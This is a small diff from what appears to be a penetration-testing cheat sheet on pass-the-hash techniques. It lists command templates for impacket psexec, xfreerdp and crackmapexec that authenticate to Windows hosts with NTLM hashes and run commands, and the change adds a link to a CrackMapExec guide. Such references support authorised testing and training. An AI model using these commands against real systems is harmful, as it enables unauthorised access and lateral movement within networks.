@@ -224,7 +224,7 @@ $ python psexec.py [username]@[target] -hashes :[NT/NTLM]
 # Method 4 - RDP PTH
 $ xfreerdp /u:Administrator /pth:[NTLM hash] /d:[domain] /v:[target]
 
-# Method 5
+# Method 5 - see guide https://www.ivoidwarranties.tech/posts/pentesting-tuts/cme/crackmapexec/
 $ crackmapexec smb [target] -u [username] -H [hash] -x "whoami" 
 ```
 
